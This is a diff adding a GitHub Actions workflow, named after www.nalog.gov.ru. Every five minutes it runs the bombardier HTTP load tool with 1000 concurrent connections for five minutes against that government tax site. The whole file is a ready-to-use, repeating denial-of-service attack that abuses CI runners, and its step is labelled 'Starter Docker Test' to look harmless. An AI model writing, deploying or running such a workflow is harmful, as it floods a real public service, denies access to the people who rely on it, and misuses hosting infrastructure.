@@ -1,0 +1,16 @@
+name: www.nalog.gov.ru
+
+on:
+  schedule:
+    - cron: "*/5 * * * *"
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Starter Docker Test
+        uses: cubetiq/starter-docker-actions@main
+        with:
+          shell: sh
+          run: docker run --rm alpine/bombardier -c 1000 -d 5m -l https://www.nalog.gov.ru
